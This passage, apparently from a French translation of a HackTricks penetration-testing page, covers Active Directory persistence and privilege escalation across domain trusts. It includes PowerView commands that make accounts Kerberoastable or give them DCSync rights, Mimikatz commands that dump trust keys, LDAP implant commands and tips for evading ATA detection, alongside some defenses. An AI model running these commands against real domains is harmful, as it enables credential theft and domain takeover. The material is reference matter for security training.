Certaines des techniques abordées précédemment peuvent être utilisées pour la persistence.\
Par exemple vous pourriez :

- Rendre des utilisateurs vulnérables à [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendre des utilisateurs vulnérables à [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Accorder des privilèges [**DCSync**](#dcsync) à un utilisateur

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**attaque Silver Ticket** crée un **TGS légitime** pour un service spécifique en utilisant le **NTLM hash** (par exemple, le **hash du compte PC**). Cette méthode est employée pour **accéder aux privilèges du service**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Une **Golden Ticket attack** implique qu'un attaquant obtienne l'**NTLM hash du compte krbtgt** dans un environnement Active Directory. Ce compte est spécial car il est utilisé pour signer tous les **Ticket Granting Tickets (TGTs)**, essentiels pour l'authentification dans le réseau AD.

Une fois que l'attaquant obtient ce hash, il peut créer des **TGTs** pour n'importe quel compte de son choix (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Ce sont comme des golden tickets forgés d'une manière qui **contourne les mécanismes de détection courants des golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posséder des certificats d'un compte ou pouvoir en demander** est une très bonne manière de persister dans le compte utilisateur (même si il change le mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Utiliser des certificats permet aussi de persister avec des privilèges élevés à l'intérieur du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'objet **AdminSDHolder** dans Active Directory assure la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **ACL** standard à travers ces groupes pour empêcher des modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée ; si un attaquant modifie l'ACL d'AdminSDHolder pour donner un accès total à un utilisateur ordinaire, cet utilisateur obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, destinée à protéger, peut donc se retourner contre l'organisation si elle n'est pas étroitement surveillée.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

À l'intérieur de chaque **Domain Controller (DC)**, un compte **local administrator** existe. En obtenant des droits admin sur une telle machine, le hash de l'Administrator local peut être extrait en utilisant **mimikatz**. Ensuite, une modification du registre est nécessaire pour **autoriser l'utilisation de ce mot de passe**, permettant l'accès remote au compte Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Vous pourriez **donner** des **permissions spéciales** à un **utilisateur** sur certains objets de domaine spécifiques qui permettront à cet utilisateur **d'escalader des privilèges à l'avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Les **security descriptors** sont utilisés pour **stocker** les **permissions** qu'**un objet** possède **sur** un **objet**. Si vous pouvez simplement **faire** un **petit changement** dans le **security descriptor** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altérer **LSASS** en mémoire pour établir un **mot de passe universel**, accordant l'accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **clear text** les **credentials** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Cela enregistre un **nouveau Domain Controller** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **avez besoin de DA** privileges et d'être à l'intérieur du **root domain**.\
Notez que si vous utilisez de mauvaises données, des logs assez moches apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Nous avons vu plus haut comment escalader des privilèges si vous avez **assez de permissions pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent aussi être utilisés pour **maintenir la persistence**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considère la **forêt** comme la frontière de sécurité. Cela implique que **compromettre un seul domaine pourrait potentiellement mener à la compromission de toute la forêt**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d'un **domaine** d'accéder à des ressources dans un autre **domaine**. Il crée essentiellement un lien entre les systèmes d'authentification des deux domaines, permettant aux vérifications d'authentification de circuler de façon transparente. Lorsqu'un trust est configuré, ils échangent et conservent des **keys** spécifiques dans leurs **Domain Controllers (DCs)**, qui sont cruciales pour l'intégrité du trust.

Dans un scénario typique, si un utilisateur souhaite accéder à un service dans un **domaine trusted**, il doit d'abord demander un ticket spécial connu sous le nom de **inter-realm TGT** auprès du DC de son propre domaine. Ce TGT est chiffré avec une **key** partagée que les deux domaines ont convenue. L'utilisateur présente ensuite ce TGT au **DC du domaine trusted** pour obtenir un service ticket (**TGS**). Après validation réussie de l'inter-realm TGT par le DC du domaine trusted, ce dernier émet un TGS, accordant à l'utilisateur l'accès au service.

**Étapes** :

1. Un **client computer** dans le **Domain 1** démarre le processus en utilisant son **NTLM hash** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si le client est authentifié avec succès.
3. Le client demande ensuite un **inter-realm TGT** à DC1, nécessaire pour accéder aux ressources dans le **Domain 2**.
4. L'inter-realm TGT est chiffré avec une **trust key** partagée entre DC1 et DC2 dans le cadre du two-way domain trust.
5. Le client apporte l'inter-realm TGT au **Domain Controller (DC2)** du **Domain 2**.
6. DC2 vérifie l'inter-realm TGT en utilisant sa trust key partagée et, si valide, émet un **Ticket Granting Service (TGS)** pour le serveur de Domain 2 auquel le client veut accéder.
7. Enfin, le client présente ce TGS au serveur, qui est chiffré avec le hash du compte du serveur, pour obtenir l'accès au service dans Domain 2.

### Different trusts

Il est important de noter qu'**un trust peut être unidirectionnel ou bidirectionnel**. Dans l'option 2-way, les deux domaines se feront confiance mutuellement, mais dans la relation de trust **1 way** un des domaines sera le **trusted** et l'autre le **trusting**. Dans ce dernier cas, **vous ne pourrez accéder qu'aux ressources à l'intérieur du domaine qui fait confiance depuis le domaine trusted**.

Si Domain A fait confiance à Domain B, A est le domaine trusting et B est le trusted. De plus, dans **Domain A**, ce sera un **Outbound trust** ; et dans **Domain B**, ce sera un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts** : C'est une configuration commune au sein de la même forêt, où un child domain a automatiquement un two-way transitive trust avec son parent domain. Essentiellement, cela signifie que les requêtes d'authentification peuvent circuler de façon transparente entre le parent et l'enfant.
- **Cross-link Trusts** : Appelés "shortcut trusts", ils sont établis entre child domains pour accélérer les processus de referral. Dans des forêts complexes, les referrals d'authentification doivent typiquement remonter jusqu'à la racine de la forêt puis redescendre jusqu'au domaine cible. En créant des cross-links, le trajet est raccourci, ce qui est particulièrement utile dans les environnements géographiquement dispersés.
- **External Trusts** : Ces trusts sont configurés entre des domaines différents et non reliés et sont non-transitifs par nature. Selon la documentation de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder à des ressources dans un domaine en dehors de la forêt actuelle qui n'est pas connecté par un forest trust. La sécurité est renforcée via le SID filtering avec les external trusts.
- **Tree-root Trusts** : Ces trusts sont automatiquement établis entre le domaine racine de la forêt et une nouvelle tree root ajoutée. Bien que peu fréquents, les tree-root trusts sont importants pour ajouter de nouveaux arbres de domaines à une forêt, leur permettant de maintenir un nom de domaine unique et en assurant la transitivité two-way. Plus d'informations sont disponibles dans le guide de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts** : Ce type de trust est un two-way transitive trust entre deux forest root domains, appliquant également le SID filtering pour renforcer les mesures de sécurité.
- **MIT Trusts** : Ces trusts sont établis avec des domaines Kerberos non-Windows, conformes à [RFC4120](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont un peu plus spécialisés et répondent aux environnements nécessitant une intégration avec des systèmes Kerberos en dehors de l'écosystème Windows.

#### Other differences in **trusting relationships**

- Une relation de trust peut aussi être **transitive** (A trust B, B trust C, donc A trust C) ou **non-transitive**.
- Une relation de trust peut être configurée comme **bidirectional trust** (les deux se font confiance) ou comme **one-way trust** (seul l'un fait confiance à l'autre).

### Attack Path

1. **Enumérer** les relations de trusting
2. Vérifier si un **security principal** (user/group/computer) a **accès** aux ressources de **l'autre domaine**, peut-être via des entrées ACE ou en étant membre de groupes de l'autre domaine. Chercher des **relations à travers les domaines** (le trust a probablement été créé pour ça).
1. kerberoast dans ce cas pourrait être une autre option.
3. **Compromettre** les **comptes** qui peuvent **pivot** à travers les domaines.

Des attaquants pourraient accéder à des ressources dans un autre domaine via trois mécanismes principaux :

- **Local Group Membership** : Des principals peuvent être ajoutés à des groupes locaux sur des machines, comme le groupe “Administrators” sur un serveur, leur accordant un contrôle important sur cette machine.
- **Foreign Domain Group Membership** : Des principals peuvent aussi être membres de groupes dans le domaine étranger. Cependant, l'efficacité de cette méthode dépend de la nature du trust et de la portée du groupe.
- **Access Control Lists (ACLs)** : Des principals peuvent être spécifiés dans une **ACL**, particulièrement en tant qu'entités dans des **ACEs** au sein d'une **DACL**, leur fournissant l'accès à des ressources spécifiques. Pour ceux qui veulent approfondir les mécaniques des ACLs, DACLs et ACEs, le whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” est une ressource précieuse.

### Find external users/groups with permissions

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les foreign security principals dans le domaine. Ce seront des users/groups provenant **d'un domaine/forest externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou en utilisant powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres façons d'enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il y a **2 trusted keys**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez vérifier celle utilisée par le domaine courant avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate as Enterprise admin to the child/parent domain abusing the trust with SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendre comment le Configuration Naming Context (NC) peut être exploité est crucial. Le Configuration NC sert de dépôt central pour les données de configuration à travers une forêt dans les environnements Active Directory (AD). Ces données sont répliquées vers chaque Domain Controller (DC) au sein de la forêt, les writable DCs conservant une copie écrivable du Configuration NC. Pour exploiter cela, il faut disposer des **SYSTEM privileges on a DC**, de préférence un child DC.

**Link GPO to root DC site**

Le container Sites du Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine au sein de la forêt AD. En opérant avec **SYSTEM privileges on any DC**, un attaquant peut lier des GPOs aux root DC sites. Cette action peut compromettre le domaine racine en manipulant les stratégies appliquées à ces sites.

Pour des informations approfondies, on peut consulter la recherche sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vecteur d'attaque consiste à cibler des gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSA, est stockée dans le Configuration NC. Avec **SYSTEM privileges on any DC**, il est possible d'accéder à la KDS Root key et de calculer les mots de passe de n'importe quel gMSA à travers la forêt.

Une analyse détaillée et des instructions pas à pas sont disponibles dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque MSA déléguée complémentaire (BadSuccessor – abusing migration attributes) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherches externes complémentaires : [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Cette méthode demande de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec **SYSTEM privileges**, un attaquant peut modifier l'AD Schema pour accorder à n'importe quel utilisateur le contrôle total sur toutes les classes. Cela peut conduire à un accès non autorisé et au contrôle des nouveaux objets AD créés.

Pour en savoir plus, consulter [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnérabilité ADCS ESC5 vise le contrôle des objets Public Key Infrastructure (PKI) afin de créer un template de certificat permettant de s'authentifier en tant que n'importe quel utilisateur au sein de la forêt. Comme les objets PKI résident dans le Configuration NC, compromettre un writable child DC permet d'exécuter des attaques ESC5.

Plus de détails sur ce sujet sont disponibles dans [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Dans les scénarios sans ADCS, l'attaquant peut mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Domaine de forêt externe - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario **votre domaine est approuvé** par un domaine externe qui vous accorde **des autorisations indéterminées** dessus. Vous devrez déterminer **quelles entités de sécurité (principals) de votre domaine disposent de quels accès sur le domaine externe** puis tenter de l'exploiter :

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domaine de forêt externe - sens unique (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario **votre domaine** est **trusting** some **privileges** to principal from a **different domains**.

Cependant, lorsqu'un **domaine est trusté** par le domaine faisant confiance, le domaine trusté **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le mot de passe trusté**. Ce qui signifie qu'il est possible d'**accéder à un utilisateur du domaine faisant confiance pour entrer dans le domaine trusté** afin de l'énumérer et tenter d'escalader davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine trusté est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la confiance de domaine (ce qui n'est pas très courant).

Une autre façon de compromettre le domaine trusté est d'attendre sur une machine où un **utilisateur du domaine trusté peut se connecter** via **RDP**. Ensuite, l'attaquant pourrait injecter du code dans le processus de session RDP et **accéder au domaine d'origine de la victime** depuis là.  
De plus, si la **victime a monté son disque dur**, depuis le processus de **session RDP** l'attaquant pourrait déposer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s'appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation de l'abus de trusts de domaine

### **Filtrage SID :**

- Le risque d'attaques exploitant l'attribut SID history à travers des trusts entre forêts est atténué par le Filtrage SID, qui est activé par défaut sur tous les trusts inter-forêts. Cela repose sur l'hypothèse que les trusts intra-forêt sont sécurisés, considérant la forêt, plutôt que le domaine, comme la frontière de sécurité selon la position de Microsoft.
- Cependant, il y a un inconvénient : le filtrage SID peut perturber des applications et l'accès des utilisateurs, ce qui conduit parfois à sa désactivation.

### **Authentification sélective :**

- Pour les trusts inter-forêts, l'utilisation de l'Authentification sélective garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. À la place, des permissions explicites sont requises pour que les utilisateurs accèdent aux domaines et aux serveurs au sein du domaine ou de la forêt faisant confiance.
- Il est important de noter que ces mesures ne protègent pas contre l'exploitation du Configuration Naming Context (NC) modifiable ni contre les attaques ciblant le compte de trust.

[**Plus d'informations sur les trusts de domaine sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abus AD basé sur LDAP depuis des implants sur l'hôte

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) réimplémente des primitives LDAP de type bloodyAD sous forme de Beacon Object Files x64 qui s'exécutent entièrement à l'intérieur d'un implant on-host (par ex., Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis appellent `ldap <subcommand>` depuis le beacon. Tout le trafic utilise le contexte de sécurité de connexion actuel sur LDAP (389) avec signing/sealing ou LDAPS (636) avec confiance automatique du certificat, donc aucun proxy socks ni artefact disque ne sont nécessaires.

### Énumération LDAP côté implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` et `get-groupmembers` résolvent les noms courts/chemins OU en DNs complets et exportent les objets correspondants.
- `get-object`, `get-attribute` et `get-domaininfo` récupèrent des attributs arbitraires (y compris les descripteurs de sécurité) ainsi que les métadonnées de forêt/domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` et `get-rbcd` exposent les candidats au roasting, les paramètres de délégation et les descripteurs existants de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directement depuis LDAP.
- `get-acl` et `get-writable --detailed` analysent la DACL pour lister les trustees, les droits (GenericAll/WriteDACL/WriteOwner/écritures d'attribut), et l'héritage, fournissant des cibles immédiates pour une escalade de privilèges via les ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives d'écriture LDAP pour l'escalade et la persistance

- Les BOF de création d'objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l'opérateur de placer de nouveaux principals ou comptes machines partout où des droits sur les OU existent. `add-groupmember`, `set-password`, `add-attribute` et `set-attribute` détournent directement les cibles une fois des droits d'écriture de propriété trouvés.
- Les commandes axées sur les ACL telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` et `add-dcsync` traduisent WriteDACL/WriteOwner sur n'importe quel objet AD en réinitialisations de mot de passe, contrôle des appartenances aux groupes ou privilèges DCSync, sans laisser d'artefacts PowerShell/ADSI. Les homologues `remove-*` suppriment les ACE injectées.

### Délégation, roasting et abus de Kerberos

- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis Kerberoastable ; `add-asreproastable` (UAC toggle) le marque pour l'AS-REP roasting sans toucher au mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les flags UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, activant des voies d'attaque constrained/unconstrained/RBCD et supprimant le besoin de PowerShell distant ou RSAT.

### Injection sidHistory, déplacement d'OU et façonnage de la surface d'attaque

- `add-sidhistory` injecte des SIDs privilégiés dans le SID history d'un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant un héritage d'accès furtif entièrement via LDAP/LDAPS.
- `move-object` change le DN/OU des ordinateurs ou utilisateurs, permettant à un attaquant de déplacer des actifs dans des OU où des droits délégués existent déjà avant d'abuser de `set-password`, `add-groupmember` ou `add-spn`.
- Des commandes de suppression à portée restreinte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après que l'opérateur a récolté des identifiants ou mis en place une persistance, minimisant la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Défenses générales

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des identifiants**

- **Domain Admins Restrictions** : Il est recommandé que les Domain Admins ne soient autorisés à se connecter qu'aux Domain Controllers, et qu'ils n'utilisent pas d'autres hôtes.
- **Service Account Privileges** : Les services ne devraient pas s'exécuter avec des privilèges Domain Admin (DA) pour maintenir la sécurité.
- **Temporal Privilege Limitation** : Pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être réalisé avec : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation** : Auditer les Event IDs 2889/3074/3075 puis appliquer LDAP signing et LDAPS channel binding sur les DCs/clients pour bloquer les tentatives d'LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Mise en œuvre de techniques de leurre**

- La mise en œuvre de leurres implique de poser des pièges, comme des utilisateurs ou ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n'expirent pas ou des comptes marqués comme Trusted for Delegation. Une approche détaillée inclut la création d'utilisateurs avec des droits spécifiques ou leur ajout à des groupes à hauts privilèges.
- Un exemple pratique utilise des outils tels que : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Pour en savoir plus sur le déploiement de techniques de leurre, voir [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifier les leurres**

- **Pour les objets utilisateur** : Les indicateurs suspects incluent un ObjectSID atypique, des connexions rares, des dates de création et un faible nombre d'échecs de mot de passe.
- **Indicateurs généraux** : Comparer les attributs d'objets potentiellement leurres avec ceux d'objets réels peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier ces leurres.

### **Contourner les systèmes de détection**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration** : Éviter l'énumération de session sur les Domain Controllers pour empêcher la détection par ATA.
- **Ticket Impersonation** : L'utilisation de clés **aes** pour la création de tickets aide à échapper à la détection en évitant la rétrogradation vers NTLM.
- **DCSync Attacks** : Il est conseillé d'exécuter depuis un hôte non-Domain Controller pour éviter la détection par ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## Références

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
